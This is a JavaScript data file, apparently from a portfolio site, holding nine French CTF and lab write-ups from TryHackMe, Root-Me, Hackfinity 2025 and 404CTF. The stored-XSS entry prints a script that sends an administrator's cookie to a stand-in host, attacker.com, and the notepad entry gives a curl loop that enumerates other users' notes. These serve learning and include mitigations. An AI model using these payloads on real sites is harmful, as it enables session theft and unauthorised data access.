import { Server, Terminal, Shield, Code, Lock, Search } from 'lucide-react';

export const writeups = [
    {
        id: 'c1',
        title: 'Basic Pentesting - TryHackMe',
        platform: 'TryHackMe',
        difficulty: 'Easy',
        date: '2024-01-15',
        readTime: '10 min',
        tags: ['Web', 'BruteForce', 'Privesc'],
        icon: Server,
        summary: 'Un writeup complet de la room Basic Pentesting sur TryHackMe. Cette machine permet de pratiquer le hacking d\'applications web et l\'escalade de privilèges.',
        content: `
# Basic Pentesting - TryHackMe Writeup

## Introduction
Cette room est parfaite pour débuter en pentesting. Elle couvre plusieurs concepts essentiels.

## Reconnaissance

### Scan Nmap
\`\`\`bash
nmap -sV -sC -oN nmap.txt 10.10.x.x
\`\`\`

Ports ouverts découverts :
- Port 22 (SSH)
- Port 80 (HTTP)
- Port 139/445 (SMB)

## Énumération Web

### Découverte de répertoires
\`\`\`bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
\`\`\`

## Exploitation

### Accès initial
Utilisation de credentials par défaut trouvés...

## Escalade de privilèges
Exploitation d'une mauvaise configuration SUID...

## Flags
- User flag: THM{...}
- Root flag: THM{...}

## Conclusion
Une excellente machine pour pratiquer les bases du pentesting.
    `,
        link: 'https://tryhackme.com/room/basicpentestingjt'
    },
    {
        id: 'wu2',
        title: 'Offensive Security Intro',
        platform: 'TryHackMe',
        difficulty: 'Very Easy',
        date: '2024-02-10',
        readTime: '5 min',
        tags: ['Web', 'Auth', 'Intro'],
        icon: Terminal,
        summary: 'Introduction à la sécurité offensive. Premier hack d\'un site web dans un environnement sécurisé.',
        content: `
# Offensive Security Intro Writeup

## Introduction
Ma première expérience en ethical hacking avec TryHackMe.

## Objectif
Hacker un faux site bancaire pour comprendre les bases.

## Méthodologie

### 1. Reconnaissance
Analyse du site web cible...

### 2. Exploitation
Utilisation d'un outil de brute force...

### 3. Accès obtenu
Connexion réussie au compte admin...

## Leçons apprises
- Importance de mots de passe forts
- Bases de l'authentification web
- Méthodologie de test de pénétration

## Conclusion
Une excellente introduction au monde du hacking éthique !
    `,
        link: 'https://tryhackme.com/room/offensivesecurityintro'
    },
    {
        id: 'wu3',
        title: 'HTML - Boutons désactivés',
        platform: 'Root-Me',
        difficulty: 'Very Easy',
        date: '2024-03-05',
        readTime: '3 min',
        tags: ['Web', 'HTML', 'Client-Side'],
        icon: Code,
        summary: 'Challenge sur la manipulation HTML côté client. Apprendre à contourner les restrictions JavaScript.',
        content: `
# HTML - Boutons désactivés - Root-Me

## Challenge
Un formulaire est désactivé. Comment l'utiliser quand même ?

## Solution

### Inspection du code
En ouvrant les DevTools (F12), on voit :
\`\`\`html
<input type="submit" disabled>
\`\`\`

### Manipulation
Plusieurs méthodes possibles :

#### Méthode 1 : DevTools
1. Clic droit sur le bouton
2. "Inspecter l'élément"
3. Supprimer l'attribut \`disabled\`

#### Méthode 2 : Console JavaScript
\`\`\`javascript
document.querySelector('input[type="submit"]').disabled = false;
\`\`\`

#### Méthode 3 : Interception de la requête
Utiliser Burp Suite pour intercepter et modifier la requête...

## Validation obtenue !

## Leçon
Ne jamais faire confiance aux validations côté client !
    `,
        link: 'https://www.root-me.org/fr/Challenges/Web-Client/HTML-boutons-desactives'
    },
    {
        id: 'wu4',
        title: 'Javascript - Authentification',
        platform: 'Root-Me',
        difficulty: 'Very Easy',
        date: '2024-03-12',
        readTime: '4 min',
        tags: ['Web', 'JavaScript', 'Auth'],
        icon: Lock,
        summary: 'Analyse d\'un système d\'authentification JavaScript. Comprendre pourquoi l\'authentification côté client est dangereuse.',
        content: `
# Javascript - Authentification - Root-Me

## Contexte
Page web avec authentification JavaScript. Le mot de passe est-il vraiment sécurisé ?

## Analyse

### Code source
En inspectant la page (Ctrl+U), on trouve :
\`\`\`javascript
function verify() {
  if (document.getElementById('password').value == 'mot_de_passe_secret') {
    alert('Accès autorisé !');
  }
}
\`\`\`

### Problème
Le mot de passe est hardcodé en clair dans le JavaScript !

## Exploitation

### Méthode 1 : Lecture directe
Simplement lire le code source...

### Méthode 2 : Console
\`\`\`javascript
verify.toString()
\`\`\`

## Flag récupéré
Mot de passe trouvé et challenge validé.

## Pourquoi c'est dangereux ?
- Code JavaScript = visible par tous
- Aucune vraie sécurité
- L'authentification doit TOUJOURS être côté serveur

## Bonnes pratiques
✅ Authentification serveur
✅ Hashing des mots de passe
✅ HTTPS obligatoire
❌ Jamais de secrets dans le JavaScript
    `,
        link: 'https://www.root-me.org/fr/Challenges/Web-Client/Javascript-Authentification'
    },
    {
        id: 'wu5',
        title: 'XSS - Stockée 1',
        platform: 'Root-Me',
        difficulty: 'Easy',
        date: '2024-04-01',
        readTime: '8 min',
        tags: ['Web', 'XSS', 'Injection'],
        icon: Shield,
        summary: 'Premier challenge XSS. Voler le cookie de session de l\'administrateur via une injection XSS stockée.',
        content: `
# XSS - Stockée 1 - Root-Me

## Qu'est-ce qu'une XSS ?
Cross-Site Scripting = injection de code JavaScript malveillant.

## Objectif
Voler le cookie de session de l'admin.

## Reconnaissance

### Test basique
\`\`\`html
<script>alert(1)</script>
\`\`\`
✅ Fonctionne ! Le site est vulnérable.

## Exploitation

### Payload pour voler le cookie
\`\`\`html
<script>
document.location='http://attacker.com/?cookie='+document.cookie;
</script>
\`\`\`

### Configuration du listener
\`\`\`bash
nc -lvp 8000
\`\`\`

### Attente de la victime
L'admin visite la page... et son cookie est capturé !

## Utilisation du cookie

### Modification du cookie
1. Ouvrir DevTools (F12)
2. Aller dans "Application" > "Cookies"
3. Remplacer notre cookie par celui de l'admin

### Validation
Flag récupéré avec les privilèges admin !

## Mitigation
- Validation et sanitization des entrées
- Content Security Policy (CSP)
- HttpOnly flag sur les cookies sensibles
- Échappement des caractères spéciaux

## Impact réel
Les XSS permettent :
- Vol de sessions
- Défacement de site
- Phishing
- Redirection malveillante
    `,
        link: 'https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-1'
    },
    {
        id: 'wu6',
        title: 'Catch Me If You Can — Hackfinity 2025',
        platform: 'Hackfinity 2025',
        difficulty: 'Easy',
        date: '2025',
        readTime: '5 min',
        tags: ['OSINT', 'Geolocation', 'Google Maps', 'Image Analysis'],
        icon: Search,
        summary: 'Challenge OSINT : identifier un restaurant à partir d\'images de caméras de surveillance de 2022. Utilisation de la géolocalisation d\'images et Google Maps.',
        content: `
# Write-up – Online Notepad Service

## Énoncé
Thanks to Void's l33t hacking skills, we obtained some CCTV footage from 2022 that might help us track Cipher's location. Our intel tells us that the individual caught on the CCTV footage that day was one of Cipher's accomplices. They were planning to meet up at one of Cipher's safe houses.

We have this image of Cipher's accomplice, Phicer, leaving a restaurant. Can you and Specter find the name of the burger restaurant?

**Flag format:** THM{restaurant_name}, separate words with underscores, and no capital letters.

## Analyse de la photo
Nous disposons d'une image prise dans une rue.

![Photo de la rue avec un panneau visible](/writeups/hackfinity2025/catchme-osint-1.png)

En regardant attentivement, un panneau de rue est visible sur la photo.

## Recherche OSINT
Nous zoomons sur le panneau pour lire le texte :

Le panneau indique **Beco do Batman**. Une recherche rapide sur Google Maps avec *Beco do Batman hamburger* nous donne plusieurs résultats.

Nous testons le premier restaurant trouvé :

## Validation du flag
Le premier restaurant listé est **Coringa do Beco**. Nous testons le flag :

\`\`\`
THM{coringa_do_beco}
\`\`\`

Et c'est la bonne réponse ! ✅

## Conclusion
En utilisant une approche OSINT basée sur l'analyse d'image et les outils de cartographie en ligne, nous avons pu retrouver le restaurant cible.

- Observation des détails visibles sur l'image.
- Recherche Google Maps avec les informations trouvées.
- Test des restaurants pour valider la réponse.

## Score obtenu
✅ **Flag trouvé et validé : 15 points**

Flag by Lux_
        `,
        link: 'https://github.com/APLOSN/TeamBurton/blob/main/Writeup/Hackfinity2025/osint/catchmeifyoucan.html'
    },
    {
        id: 'wu7',
        title: 'Write-up – Order',
        platform: 'Hackfinity 2025',
        difficulty: 'Medium',
        date: '2025',
        readTime: '5 min',
        tags: ['Crypto', 'XOR', 'Known-Plaintext'],
        icon: Lock,
        summary: 'Message chiffré avec un XOR à clé répétitive. Known-plaintext attack : l\'en-tête ORDER: permet d\'extraire la clé SNEAKY et de déchiffrer le flag.',
        content: `
# Write-up – Order

## Énoncé
Nous avons intercepté un message de Cipher contenant leur prochaine cible. Le message est chiffré avec un chiffrement XOR à clé répétitive. Cependant, une erreur critique a été commise : chaque message commence toujours par l'en-tête :

\`\`\`
ORDER:
\`\`\`

Voici le message intercepté :

\`\`\`
1c1c01041963730f31352a3a386e24356b3d32392b6f6b0d323c22243f6373
\`\`\`

\`\`\`
1a0d0c302d3b2b1a292a3a38282c2f222d2a112d282c31202d2d2e24352e60
\`\`\`

## Analyse
Nous savons que :

- Le message chiffré est converti en hexadécimal.
- L'en-tête \`ORDER:\` est connu.
- La relation XOR permet de récupérer la clé.

En utilisant la formule :

\`\`\`
cle = plaintext XOR ciphertext
\`\`\`

Nous pouvons extraire la clé.

## Extraction de la clé
En appliquant XOR entre l'en-tête \`ORDER:\` et le début du message chiffré :

\`\`\`
Key (hex): 534e45414b59
\`\`\`

\`\`\`
Key (bytes): SNEAKY
\`\`\`

## Déchiffrement
Nous utilisons la clé trouvée pour déchiffrer l'intégralité du message :

\`\`\`python
ciphertext_hex = "1c1c01041963730f31352a3a386e24356b3d32392b6f6b0d323c22243f63731a0d0c302d3b2b1a292a3a38282c2f222d2a112d282c31202d2d2e24352e60"
key = bytes.fromhex("534e45414b59")  # "SNEAKY"

ciphertext = bytes.fromhex(ciphertext_hex)

# XOR decryption
plaintext = bytes([ciphertext[i] ^ key[i % len(key)] for i in range(len(ciphertext))])

print(plaintext.decode("utf-8", errors="ignore"))
\`\`\`

## Résultat
Le message déchiffré contient le flag :

\`\`\`
THM{the_hackfinity_highschool}
\`\`\`

✅ **Flag trouvé et validé : 30 points**

Flag by Petitoo & Lux_
        `,
        link: 'https://github.com/APLOSN/TeamBurton/blob/main/Writeup/Hackfinity2025/crypto/order.html'
    },
    {
        id: 'wu8',
        title: 'Write-up – Online Notepad Service',
        platform: 'Hackfinity 2025',
        difficulty: 'Medium',
        date: '2025',
        readTime: '7 min',
        tags: ['Web', 'IDOR', 'API', 'Basic Auth'],
        icon: Code,
        summary: 'Faiblesse d\'autorisation sur une API REST de notes. Bruteforce des note_id avec Basic Auth pour accéder aux notes d\'autres utilisateurs.',
        content: `
# Write-up – Online Notepad Service

## Énoncé
L'épreuve consiste à accéder à des notes stockées sur un service en ligne, où chaque utilisateur a ses propres notes protégées. Nous avons reçu des identifiants :

- **Utilisateur :** noel
- **Mot de passe :** pass1234

L'objectif est de trouver un flag dans les notes, en exploitant une potentielle faiblesse dans l'API REST.

## Analyse de la cible
L'URL d'accès aux notes est :

\`\`\`
http://10.10.201.131/note.php
\`\`\`

L'énoncé mentionne que le service est sécurisé et que chaque utilisateur ne peut voir que ses propres notes. Cependant, la mention d'une API REST et d'un \`note_id\` paramétrable (\`note_id=\${i}\`) suggère que les notes peuvent être récupérées en itérant sur les IDs.

Notre partenaire a utilisé \`curl\` pour tester différentes valeurs de \`note_id\`, mais il a remarqué que les requêtes tombaient toujours sur la page de login, malgré l'utilisation d'un cookie stocké dans \`cookies.txt\`.

## Tentative d'exploitation via bruteforce
L'idée initiale était de tester tous les \`note_id\` possibles en utilisant un script \`curl\` :

\`\`\`bash
for i in {0..1000}; do
  curl -L -c cookies.txt "http://10.10.201.131/note.php?note_id=\${i}"
done
\`\`\`

Cependant, cela ne fonctionnait pas, car l'authentification semblait poser problème.

## Problème d'authentification
- L'épreuve utilise **Basic Authentication**, donc passer simplement les cookies n'était pas suffisant.
- En Basic Auth, les identifiants doivent être encodés en **Base64** et envoyés dans l'en-tête HTTP.

## Solution
Nous avons ajusté notre requête en ajoutant l'en-tête \`Authorization\` pour l'authentification HTTP Basic :

\`\`\`bash
for i in {0..1000}; do
  curl -L -H "Authorization: Basic $(echo -n 'noel:pass1234' | base64)" \\
       "http://10.10.201.131/note.php?note_id=\${i}"
done
\`\`\`

### Explication
- \`echo -n 'noel:pass1234' | base64\` encode \`noel:pass1234\` en Base64.
- \`Authorization: Basic <token>\` permet de s'authentifier directement sans cookies.
- \`note_id=\${i}\` permet d'incrémenter les IDs pour tenter d'accéder à toutes les notes.

## Résultat
Après quelques tests manuels, nous avons trouvé un \`note_id\` qui contenait le flag :

\`\`\`
flag{this_is_the_secret_note_flag}
\`\`\`

## Conclusion
L'épreuve était une **faiblesse d'autorisation** classique où l'API ne vérifie pas correctement si l'utilisateur a le droit d'accéder à une note donnée.

- Une API sécurisée devrait **lier chaque note à un utilisateur** et **vérifier l'ID de session** avant d'afficher le contenu.
- Ici, il suffisait de brute-forcer les \`note_id\` avec l'authentification correcte pour accéder aux notes d'autres utilisateurs.

### Moyens d'atténuation
- Implémenter un **contrôle d'accès basé sur l'utilisateur**.
- Éviter d'utiliser des IDs incrémentaux prévisibles pour les notes (UUID recommandé).
- Vérifier que l'utilisateur authentifié est bien le propriétaire de la note demandée.

## Score obtenu
✅ **Flag trouvé et validé : 20 points**

Flag by Pepitoo
        `,
        link: 'https://github.com/APLOSN/TeamBurton/blob/main/Writeup/Hackfinity2025/Web/online-notepad.html'
    },
    {
        id: 'wu9',
        title: 'Cbizarre [1/2] — 404CTF 2025',
        platform: '404CTF 2025',
        difficulty: 'Easy',
        date: '2025',
        readTime: '3 min',
        tags: ['Reverse', 'Ghidra', 'Pastebin'],
        icon: Terminal,
        summary: 'Reverse engineering d\'un binaire avec Ghidra. Le programme contient un lien Pastebin en dur qui expose directement le flag.',
        content: `
# Cbizarre [1/2] — 404CTF 2025

## Énoncé
Vous êtes prêt à partir en voyage spatial ! Mais la fusée demande le fameux flag qui commence par 404CTF{...}… sauf que vous l'avez oublié 😢. Ni une ni deux, vous vous plongez dans les méandres du programme pour voir s'il est vraiment nécessaire d'avoir un mot de passe pour découvrir ce mystérieux flag…

## Analyse
Ils disent clairement qu'il faut l'ouvrir donc je le mets dans mon Ghidra.

Je scroll un peu et je tombe là-dessus :

![Vue Ghidra — lien Pastebin visible dans le binaire](/writeups/404ctf2025/cbizarre-ghidra.png)

Avec un lien Pastebin :

\`\`\`
https://pastebin.com/raw/n8CXuwE0
\`\`\`

Qui donne le flag directement.

## Flag
\`\`\`
404CTF{PAst3_mY_FL2g}
\`\`\`

✅ **+100 pts**
        `,
        link: 'https://pastebin.com/raw/n8CXuwE0'
    }
];

// Fonction utilitaire pour obtenir un writeup par ID
export const getWriteupById = (id) => {
    return writeups.find(wu => wu.id === id);
};

// Fonction pour obtenir les writeups par plateforme
export const getWriteupsByPlatform = (platform) => {
    return writeups.filter(wu => wu.platform === platform);
};

// Fonction pour obtenir les writeups par difficulté
export const getWriteupsByDifficulty = (difficulty) => {
    return writeups.filter(wu => wu.difficulty === difficulty);
};